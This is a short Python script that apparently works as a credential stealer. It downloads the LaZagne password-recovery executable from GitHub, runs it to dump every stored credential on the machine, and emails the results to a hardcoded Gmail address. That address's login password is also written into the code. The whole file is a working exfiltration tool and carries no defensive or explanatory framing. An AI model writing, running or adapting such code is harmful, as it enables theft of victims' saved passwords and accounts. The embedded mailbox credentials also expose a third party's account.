import requests, subprocess, smtplib


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("sereganazemcev@gmail.com", "22833720041917Master", result)
